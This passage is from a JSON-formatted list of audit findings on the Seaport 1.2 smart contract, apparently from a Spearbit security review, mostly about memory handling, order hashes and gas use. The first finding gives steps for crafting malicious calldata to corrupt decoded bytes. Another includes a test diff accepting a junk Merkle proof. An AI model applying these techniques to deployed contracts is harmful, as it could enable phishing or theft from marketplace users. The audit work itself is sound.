        "title": "ABI decoding for bytes: memory can be corrupted by maliciously constructing the calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the code snippet below, size can be made 0 by maliciously crafting the calldata. In this case, the free memory is not incremented. assembly { mPtrLength := mload(0x40) let size := and( add( and(calldataload(cdPtrLength), OffsetOrLengthMask), AlmostTwoWords ), OnlyFullWordMask ) calldatacopy(mPtrLength, cdPtrLength, size) mstore(0x40, add(mPtrLength, size)) } This has two different consequences: 1. If the memory offset mPtrLength is immediately used then junk values at that memory location can be interpreted as the decoded bytes type. In the case of Seaport 1.2, the likelihood of the current free memory pointing to junk value is low. So, this case has low severity. 17 2. The consequent memory allocation will also use the value mPtrLength to store data in memory. This can lead to corrupting the initial memory data. In the worst case, the next allocation can be tuned so that the first bytes data can be any arbitrary data. To make the size calculation return 0: 1. Find a function call which has bytes as a (nested) parameter. 2. Modify the calldata field where the length of the above byte is stored to the new length 0xffffe0. 3. The calculation will now return size = 0. Note: there is an additional requirement that this bytes type should be inside a dynamic struct. Otherwise, for example, in case of function foo(bytes calldata signature) , the compiler will insert a check that calldata- size is big enough to fit signature.length. Since the value 0xffffe0 is too big to be fit into calldata, such an attack is impractical. However, for bytes type inside a dynamic type, for example in function foo(bytes[] calldata signature), this check is skipped by solc (likely because it's expensive). For a practical exploit we need to look for such function. In case of Seaport 1.2 this could be the matchAdvancedOrders(AdvancedOrder[] calldata orders, ...) function. The struct AdvancedOrder has a nested parameter bytes signature as well as bytes extraData. In the above exploit one would be able to maliciously modify the calldata in such a way that Seaport would interpret the data in extraData as the signature. Here is a proof of concept for a simplified case that showcases injecting an arbitrary value into a decoded bytes. As for severity, even though interpreting calldata differently may not fundamentally break the protocol, an attacker with enough effort may be able to use this for subtle phishing attacks or as a precursor to other attacks.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport receives a collection of advanced orders to match or fulfill, if one of the orders has a CONTRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. genera- teOrder(...) can provide new consideration item recipients for this order. These new recipients are going to be used for this order from this point on. In _getGeneratedOrder, there is no comparison between old or new consideration recipients. The provided new recipients can create an issue when aggregating consideration items. Since the fulfillment data is provided beforehand by the caller of the Seaport endpoint, the caller might have provided fulfillment aggregation data that would have aggregated/combined one of the consideration items of this changed advance order with another consideration item. But the aggregation had taken into consideration the original recipient of the order in question. Multiple consideration items can only be aggregated if they share the same itemType, token, identi- fier, and recipient (ref). The new recipients provided by the contract offerer can break this invariant and in turn cause a revert.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CriteriaResolvers.criteriaProof is not validated in the identifierOrCriteria == 0 case",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the case of identifierOrCriteria == 0, the criteria resolver completely skips any validations on the Merkle proof and in particular is missing the validation that CriteriaResolvers.criteriaProof.length == 0. Note: This is also present in Seaport 1.1 and may be a known issue. Proof of concept: modified @@ -3568,9 +3568,8 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { test/advanced.spec.ts // Seller approves marketplace contract to transfer NFTs await set1155ApprovalForAll(seller, marketplaceContract.address, true); - - + const { root, proofs } = merkleTree([nftId]); const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))]; const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))]; const consideration = [ getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address), @@ -3578,8 +3577,9 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address), ]; + - + // Add a junk criteria proof and the test still passes const criteriaResolvers = [ buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]), buildResolver(0, 0, 0, nftId, ,! [\"0xdead000000000000000000000000000000000000000000000000000000000000\"]), ]; const { order, orderHash, value } = await createOrder(",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calls to TypehashDirectory will be successful",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "TypehashDirectory's deployed bytecode starts with 00 which corresponds to STOP opcode (SSTORE2 also uses this pattern). This choice for the 1st bytecode causes accidental calls to the contract to succeed silently.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_isValidBulkOrderSize does not perform the signature length validation correctly.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In _isValidBulkOrderSize the signature's length validation is performed as follows: let length := mload(signature) validLength := and( lt(length, BulkOrderProof_excessSize), lt(and(sub(length, BulkOrderProof_minSize), AlmostOneWord), 2) ) The sub opcode in the above snippet wraps around. If this was the correct formula then it would actually simplify to: lt(and(sub(length, 3), AlmostOneWord), 2) The simplified and the current version would allow length to also be 3, 4, 35, 36, 67, 68 but _isValidBulkOrder- Size actually needs to check that length ( l ) has the following form: where x 2 f0, 1g and y 2 f1, 2, (cid:1) (cid:1) (cid:1) , 24g ( y represents the height/depth of the bulk order).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When contractNonce occupies more than 12 bytes the truncated nonce shared back with the contract offerer through ratifyOrder would be smaller than the actual stored nonce",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When contractNonce occupies more than 12 bytes the truncated nonce shared back with the con- tract offerer through ratifyOrder would be smaller than the actual stored nonce: // Write contractNonce to calldata dstHead.offset(ratifyOrder_contractNonce_offset).write( uint96(uint256(orderHash)) ); This is due to the way the contractNonce and the offerer's address are mixed in the orderHash: assembly { orderHash := or(contractNonce, shl(0x60, offerer)) }",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "abi_decode_bytes does not mask the copied data length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When abi_decode_bytes decodes bytes, it does not mask the copied length of the data in memory (other places where the length is masked by OffsetOrLengthMask).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OrderHash in the context of contract orders need not refer to a unique order",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In Seaport 1.1 and in Seaport 1.2 for non-contract orders, order hashes have a unique correspon- dence with the order, i.e., it can be used to identify the status of an order on-chain and track it. However, in case of contract orders, this is not the case. It is simply the current nonce of the offerer, combined with the address. This cannot be used to uniquely track an order on-chain. uint256 contractNonce; unchecked { contractNonce = _contractNonces[offerer]++; } assembly { orderHash := or(contractNonce, shl(0x60, offerer)) } Here are some example scenarios where this can be problematic: Scenario 1: A reverted contract order and the adjacent succeeding contract order will have the same order hash, regardless of whether they correspond to the same order. 1. Consider Alice calling fulfilledAdvancedOrder for a contract order with offerer = X, where X is a smart contract that offers contract orders on Seaport 1.2. Assume that this transaction failed because enough gas was not provided for the generateOrder call. This tx would revert with a custom error InvalidContrac- tOrder, generated from OrderValidator.sol#L391. 22 2. Consider Bob calling fulfilledAdvancedOrder for a different contract order with offerer = X, same smart contract offerer. OrderFulfiller.sol#L124 This order will succeed and emit the OrderFulfilled event the from In the above scenario, there are two different orders, one that reverted on-chain and the other that succeeded, both having the same orderHash despite the orders only sharing the same contract offerer--the other parameters can be completely arbitrary. Scenario 2: Contract order hashes computed off-chain can be misleading. 1. Consider Alice calling fulfilledAdvancedOrder for a contract order with offerer = X, where X is a smart contract that offers contract orders on Seaport 1.2. Alice computed the orderHash of their order off-chain by simulating the transaction, sends the transaction and polls the OrderFulfilled event with the same orderHash to know if the order has been fulfilled. 2. Consider Bob calling fulfilledAdvancedOrder for any contract order with offerer = X, the same smart contract offerer. 3. Bob's transaction gets included first. An OrderFulfilled event is emitted, with the orderHash to be the same hash that Alice computed off-chain! Alice may believe that their order succeeded. for non-contract Orders, the above approach would be valid, i.e., one may generate and sign an order, Note: compute the order hash of an order off-chain and poll for an OrderFulfilled with the order hash to know that it was fulfilled. Note: even though there is an easier way to track if the order succeeded in these cases, in the general case, Alice or Bob need not be the one executing the orders on-chain. And an off-chain agent may send misleading notifications to either parties that their order succeeded due to this quirk with contract order hashes.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When _contractNonces[offerer] gets updated no event is emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When _contractNonces[offerer] gets updated no event is emitted. This is in contrast to when a counter is updated. One might be able to extract the _contractNonces[offerer] (if it doesn't overflow 12 bytes to enter into the offerer region in the orderhash) from a later event when OrderFulfilled gets emited. OrderFulfilled only gets emitted for an order of CONTRACT type if the generateOrder(...)'s return data satisffies all the constraints.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In general a contract offerer or a zone cannot draw a conclusion accurately based on the spent offer amounts or received consideration amounts shared with them post-trasnfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When one calls one of the Seaport endpoints that fulfills or matches a collection of (advanced) orders, the used offer or consideration items will go through different modification steps in the memory. In particular, the startAmount a of these items is an important parameter to inspect: a ! a0 ! b ! a0 a : original startAmount parameter shared to Seaport by the caller encoded in the memory. a0 : the interpolated value and for orders of CONTRACT order type it is the value returned by the contract offerer (interpolation does not have an effect in this case since the startAmount and endAmount are enforced to be equal). b : must be 0 for used consideration items, otherwise the call would revert. For offer items, it can be in [0, 1) (See The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general). a0 : is the final amount shared by Seaport to either a zone for restricted orders and a contract offerer for CONTRACT order types.  Offer Items For offer items, perhaps the zone or the contract offerer would like to check that the offerer has spent a maxi- mum a0 of that specific offer item. For the case of restricted orders where the zone's validateOrder(...) will be called, the offerer might end up spending more than a0 amount of a specific token with the same identifier if the collection of orders includes:  A mix of open and restricted orders.  Multiple zones for the same offerer, offering the same token with the same identifier.  Multiple orders using the same zone. In this case, the zone might not have a sense of the orders of the transfers or which orders are included in the transaction in question (unless the contexts used by the zone enforces the exact ordering and number of items that can be matched/fulfilled in the same transaction). Note the order of transfers can be manipulated/engineered by constructing specific fulfillment data. Given a fulfillment data to combine/aggregate orders, there could be permutations of it that create different ordering of the executions.  An order with an actor (a consideration recipient, contract offerer, weird token, ...) that has approval to transfer this specific offer item for the offerer in question. And when Seaport calls into (NATIVE, ERC1155 token transfers, ...) this actor, the actor would transfer the token to a different address than the offerer. There also is a special case where an order with the same offer item token and identifier is signed on a different instance of Seaport (1.0, 1.1, 1.2, ..., or other non-official versions) which an actor (a consideration recipient, con- tract offerer, weird token, ...) can cross-call into (related Cross-Seaport re-entrancy with the stateful validateOrder call). The above issue can be avoided if the offerer makes sure to not sign different transactions across different or the same instances of Seaport which 1. Share the same offer type, offer token, and offer identifier, 2. but differ in a mix of zone, and order type 24 3. can be active at a shared timestamp And/or the offerer does not give untrusted parties their token approvals. A similar issue can arise for a contract offerer if they use a mix of signed orders of non-CONTRACT order type and CONTRACT order types.  Consideration Items For consideration items, perhaps the zone or the contract offerer would like to check that the recipient of each consideration item has received a minimum of a0 of that specific consideration item. This case also is similar to the offer items issues above when a mix of orders has been used.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cross-Seaport re-entrancy with the stateful validateOrder call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The re-entrancy check in Seaport 1.2 will prevent the Zone from interacting with Seaport 1.2 again. However, an interesting scenario would happen when if the conduit has open channels to both Seaport 1.1 and Seaport 1.2 (or different deployments/forks of Seaport 1.2). This can lead to cross Seaport re-entrancy. This is not immediately problematic as Zones have limited functionality currently. But since Zones can be as flexible as possible, Zones need to be careful if they can interact with multiple versions of Seaport. Note: for Seaport 1.1's zone, the check _assertRestrictedBasicOrderValidity happens before the transfers, and it's also a staticcall. In the future, Seaport 1.3 could also have the same zone interaction, i.e., stateful calls to zones allowing for complex cross-Seaport re-entrancy between 1.2 and 1.3. Note: also see getOrderStatus and getContractOffererNonce are prone to view reentrancy for concerns around view-only re-entrancy.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getOrderStatus and getContractOffererNonce are prone to view reentrancy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Nonces[offerer] gets updated if there is a mix of contract offerer orders and partial orders are used, Seaport would call into the offerer contracts (let's call one of these offerer contracts X ). In turn X can be a contract that would call into other contracts (let's call them Y ) that take into consideration _orderStatus[orderHash] or _contractNonces[offerer] in their codebase by calling getOrderStatus or getContractOffererNonce The values for _orderStatus[orderHash] or _contractNonces[offerer] might get updated after Y seeks those from Seaport due to for example multiple partial orders with the same orderHash or multiple offerer contract orders using the same offerer. Therefore Y would only take into consideration the mid-flight values and not the final ones after the whole transaction with Seaport is completed.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The size calculation can be incorrect for large numbers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The maximum value of memory offset is defined in PointerLibraries.sol#L22 as OffsetOr- LengthMask = 0xffffffff, i.e., 232 (cid:0) 1. However, the mask OnlyFullWordMask = 0xffffe0; is defined to be a 24-bit number. Assume that the length of the bytes type where src points is 0xffffe0, then the following piece of code incorrectly computes the size as 0. function abi_encode_bytes( MemoryPointer src, MemoryPointer dst ) internal view returns (uint256 size) { unchecked { size = ((src.readUint256() & OffsetOrLengthMask) + AlmostTwoWords) & OnlyFullWordMask; ... This is because the constant OnlyFullWordMask does not have the two higher order bytes set (as a 32-bit type). Note: in practice, it can be difficult to construct bytes of length 0xffffe0 due to upper bound defined by the block gas limit. However, this length is still below Seaport's OffsetOrLengthMask, and therefore may be able to evade many checks. 26",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_prepareBasicFulfillmentFromCalldata expands memory more than it's needed by 4 extra words",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In _prepareBasicFulfillmentFromCalldata , we have: // Update the free memory pointer so that event data is persisted. mstore(0x40, add(0x80, add(eventDataPtr, dataSize))) OrderFulfilled's event data is stored in the memory in the region [eventDataPtr, eventDataPtr + dataSize). It's important to note that eventDataPtr is an absolute memory pointer and not a relative one. So the above 4 words, 0x80, in the snippet are extra. example, For in test/basic.spec.ts the Seaport memory profile at tract.connect(buyer).fulfillBasicOrder(basicOrderParameters, {value,}) looks like: \"ERC721 <=> ETH (basic, minimal and verified on-chain)\" case the call of marketplaceCon- the end of test the in 28 0x000 23b872dd000000000000000000000000f372379f3c48ad9994b46f36f879234a ; transferFrom.selector(from, to, id) ,! 0x020 27b4556100000000000000000000000016c53175c34f67c1d4dd0878435964c1 ; ... 0x040 0000000000000000000000000000000000000000000000000000000000000440 ; free memory pointer 0x060 0000000000000000000000000000000000000000000000000000000000000000 ; ZERO slot 0x080 fa445660b7e21515a59617fcd68910b487aa5808b8abda3d78bc85df364b2c2f ; orderTypeHash 0x0a0 000000000000000000000000f372379f3c48ad9994b46f36f879234a27b45561 ; offerer 0x0c0 0000000000000000000000000000000000000000000000000000000000000000 ; zone 0x0e0 78d24b64b38e96956003ddebb880ec8c1d01f333f5a4bfba07d65d5c550a3755 ; h(ho) 0x100 81c946a4f4982cb7ed0c258f32da6098760f98eaf6895d9ebbd8f9beccb293e7 ; h(hc, ha[0], ..., ha[n]) 0x120 0000000000000000000000000000000000000000000000000000000000000000 ; orderType 0x140 0000000000000000000000000000000000000000000000000000000000000000 ; startTime 0x160 000000000000000000000000000000000000ff00000000000000000000000000 ; endTime 0x180 8f1d378d2acd9d4f5883b3b9e85385cf909e7ab825b84f5a6eba28c31ea5246a ; zoneHash > orderHash 0x1a0 00000000000000000000000016c53175c34f67c1d4dd0878435964c1c9b70db7 ; salt > fulfiller 0x1c0 0000000000000000000000000000000000000000000000000000000000000080 ; offererConduitKey > offerer array head ,! 0x1e0 0000000000000000000000000000000000000000000000000000000000000120 ; counter[offerer] > consideration array head ,! 0x200 0000000000000000000000000000000000000000000000000000000000000001 ; h[4]? > offer.length 0x220 0000000000000000000000000000000000000000000000000000000000000002 ; h[...]? > offer.itemType 0x240 000000000000000000000000c67947dc8d7fd0c2f25264f9b9313689a4ac39aa ; > offer.token 0x260 00000000000000000000000000000000c02c1411443be3c204092b54976260b9 ; > offer.identifierOrCriteria 0x280 0000000000000000000000000000000000000000000000000000000000000001 ; > offer's current interpolated amount ,! 0x2a0 0000000000000000000000000000000000000000000000000000000000000001 ; > totalConsiderationRecipients + 1 ,! 0x2c0 0000000000000000000000000000000000000000000000000000000000000000 ; > receivedItemType 0x2e0 0000000000000000000000000000000000000000000000000000000000000000 ; > consideration.token (NATIVE) 0x300 0000000000000000000000000000000000000000000000000000000000000000 ; > consideration.identifierOrCriteria ,! 0x320 0000000000000000000000000000000000000000000000000000000000000001 ; > consideration's current interpolated amount ,! 0x340 000000000000000000000000f372379f3c48ad9994b46f36f879234a27b45561 ; > offerer 0x360 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x380 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3a0 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3c0 0000000000000000000000000000000000000000000000000000000000000000 ; unused 0x3e0 0000000000000000000000000000000000000000000000000000000000000040 ; sig.length 0x400 26aa4a333d4b615af662e63ce7006883f678068b8dc36f53f70aa79c28f2032c ; sig[ 0:31] 0x420 f640366430611c54bafd13314285f7139c85d69f423794f47ee088fc6bfbf43f ; sig[32:63] 0x440 0000000000000000000000000000000000000000000000000000000000000001 ; fulfilled = 1; // returns ,! (bool fulfilled) Notice that 4 unused memory slots.  Transaction Trace This is also a good example to see that certain memory slots that previously held values like zoneHash, salt, ... have been overwritten to due to the small number of consideration items (this actually happens inside _- prepareBasicFulfillmentFromCalldata).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "TypehashDirectory's constructor code can be optimized.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "TypehashDirectory's deployed bytecode in its current form is: 00 3ca2711d29384747a8f61d60aad3c450405f7aaff5613541dee28df2d6986d32 ; h_00 bf8e29b89f29ed9b529c154a63038ffca562f8d7cd1e2545dda53a1b582dde30 ; h_01 53c6f6856e13104584dd0797ca2b2779202dc2597c6066a42e0d8fe990b0024d ; h_02 a02eb7ff164c884e5e2c336dc85f81c6a93329d8e9adf214b32729b894de2af1 ; h_03 39c9d33c18e050dda0aeb9a8086fb16fc12d5d64536780e1da7405a800b0b9f6 ; h_04 1c19f71958cdd8f081b4c31f7caf5c010b29d12950be2fa1c95070dc47e30b55 ; h_05 ca74fab2fece9a1d58234a274220ad05ca096a92ef6a1ca1750b9d90c948955c ; h_06 7ff98d9d4e55d876c5cfac10b43c04039522f3ddfb0ea9bfe70c68cfb5c7cc14 ; h_07 bed7be92d41c56f9e59ac7a6272185299b815ddfabc3f25deb51fe55fe2f9e8a ; h_08 d1d97d1ef5eaa37a4ee5fbf234e6f6d64eb511eb562221cd7edfbdde0848da05 ; h_09 896c3f349c4da741c19b37fec49ed2e44d738e775a21d9c9860a69d67a3dae53 ; h_10 bb98d87cc12922b83759626c5f07d72266da9702d19ffad6a514c73a89002f5f ; h_11 e6ae19322608dd1f8a8d56aab48ed9c28be489b689f4b6c91268563efc85f20e ; h_12 6b5b04cbae4fcb1a9d78e7b2dfc51a36933d023cf6e347e03d517b472a852590 ; h_13 d1eb68309202b7106b891e109739dbbd334a1817fe5d6202c939e75cf5e35ca9 ; h_14 1da3eed3ecef6ebaa6e5023c057ec2c75150693fd0dac5c90f4a142f9879fde8 ; h_15 eee9a1392aa395c7002308119a58f2582777a75e54e0c1d5d5437bd2e8bf6222 ; h_16 c3939feff011e53ab8c35ca3370aad54c5df1fc2938cd62543174fa6e7d85877 ; h_17 0efca7572ac20f5ae84db0e2940674f7eca0a4726fa1060ffc2d18cef54b203d ; h_18 5a4f867d3d458dabecad65f6201ceeaba0096df2d0c491cc32e6ea4e64350017 ; h_19 80987079d291feebf21c2230e69add0f283cee0b8be492ca8050b4185a2ff719 ; h_20 3bd8cff538aba49a9c374c806d277181e9651624b3e31111bc0624574f8bca1d ; h_21 5d6a3f098a0bc373f808c619b1bb4028208721b3c4f8d6bc8a874d659814eb76 ; h_22 1d51df90cba8de7637ca3e8fe1e3511d1dc2f23487d05dbdecb781860c21ac1c ; h_23 for height 24",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ConsiderationItem.recipient's absolute memory offset can be cached and reused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "ConsiderationItem.recipient's absolute offset is calculated twice in the above context.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "currentAmount can potentially be reused when storing this value in memory in _validateOrdersAnd- PrepareToFulfill",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "We have considerationItem.startAmount = currentAmount; // 1 ... mload( // 2 add( considerationItem, ReceivedItem_amount_offset ) ) From 1 where considerationItem.startAmount is assigned till 2 its value is not modifed.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Information packed in BasicOrderType and how receivedItemType and offeredItemType are derived",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Currently the way information is packed and unpacked in/from BasicOrderType is inefficient. Basi- cOrderType is only used for BasicOrderParameters and when unpacking to give an idea how diffferent parameters are packed into this field.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "invalidNativeOfferItemErrorBuffer calculation can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "We have: func sig ------------------------------------------------------------------------------ 0b10101000000101110100010 00 0000100 0b01010101100101000100101 00 1000010 0b11101101100110001010010 10 1110100 0b10000111001000000001101 10 1000001 ^ 9th bit matchOrders matchAdvancedOrders fulfillAvailableOrders fulfillAvailableAdvancedOrders",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "When accessing or writing to memory the value of an enum for a struct field, the enum's validation is performed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When accessing or writing to memory the value of an enum type for a struct field, the enum's validation is performed: enum Foo { f1, f2, ... fn } struct boo { Foo foo; ... } boo memory b; P(b.foo); // <--- validation will be performed to check whether the value of `b.foo` is out of range This would apply to OrderComponents.orderType, OrderParameters.orderType, CriteriaResolver.side, ReceivedItem.itemType, OfferItem.itemType, BasicOrderParameters.basicOrderType. ConsiderationItem.itemType, SpentItem.itemType,",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The zero memory slot can be used when supplying no criteria to fulfillOrder, fulfillAvailable- Orders, and matchOrders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When the external functions in this context are called, no criteria is passed to _validateAndFulfil- lAdvancedOrder, _fulfillAvailableAdvancedOrders, or _matchAdvancedOrders: new CriteriaResolver[](0), // No criteria resolvers supplied. When this gets compiled into YUL, the compiler updates the free memory slot by a word and performs an out of range and overflow check for this value: 34 function allocate_memory_<ID>() -> memPtr { memPtr := mload(64) let newFreePtr := add(memPtr, 32) if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() } mstore(64, newFreePtr) }",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "matchOrders, matchAdvancedOrders, fulfillAvailableAdvancedOrders, fulfillAvailableOrders re- turns executions which is cleaned and validator by the compiler",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Currently, the return values of matchOrders, matchAdvancedOrders, fulfillAvailableAdvance- dOrders, fulfillAvailableOrders are cleaned and validator by the compiler.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "abi.encodePacked is used when only bytes/string concatenation is needed.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the context above, one is using abi.encodePacked like the following: 35 bytes memory B = abi.encodePacked( \"<B1>\", \"<B2>\", ... \"<Bn>\" ); For each substring, this causes the compiler to use an mstore (if the substring occupies more than 32 bytes, it will use the least amount of mstores which is the ceiling of the length of substring divided by 32), even though multiple substrings can be combined to fill in one memory slot and thus only use 1 mstore for those.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "solc ABI encoder is used when OrderFulfilled is emitted in _emitOrderFulfilledEvent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "solc's ABI encoder is used when OrderFulfilled is emitted in _emitOrderFulfilledEvent. That means all the parameters are cleaned and validated before they are provided to log3.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The use of identity precompile to copy memory need not be optimal across chains",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The PointerLibraries contract uses a staticcall to identity precompile, i.e., address 4 to copy memory--poor man's memcpy. This is used as a cheaper alternative to copy 32-byte chunks of memory using mstore(...) in a for-loop. However, the gas efficiency of the identity precompile relies on the version of the EVM on the underlying chain. The base call cost for precompiles before Berlin hardfork was 700 (from Tangerine Wistle), and after Berlin, this was reduced to 100 (for warm accounts and precompiles). Many EVM compatible L1s, and even L2s are on old EVM versions. And using the identity precompile would be more expensive than doing mstores(...).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use the zero memory slot for allocating empty data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In cases where an empty data needs to be allocated, one can use the zero slot. This can also be used as initial values for offer and consideration in abi_decode_generateOrder_returndata.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Some address fields are masked even though the ConsiderationDecoder wanted to skip this mask- ing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When a field of address type from a struct in memory is used, the compiler masks (also: 2, 3) it. struct A { address addr; } A memory a; // P is either a statement or a function call // when compiled --> and(mload(a_addr_pos), 0xffffffffffffffffffffffffffffffffffffffff) P(a.addr); Also the compiler is making use of function cleanup_address(value) -> cleaned { cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff) } function abi_encode_address(value, pos) { mstore(pos, and(value, 0xffffffffffffffffffffffffffffffffffffffff)) } in a few places",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "div(x, (1<<n)) can be transformed into shr(n, x)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The above context, one is dividing a number by a constant which is power of 2: div(x, c) // where c = 1 << n One can perform the same operation using shr which cost less gas.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use fallback() to circumvent Solidity's dispatcher mechanism",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
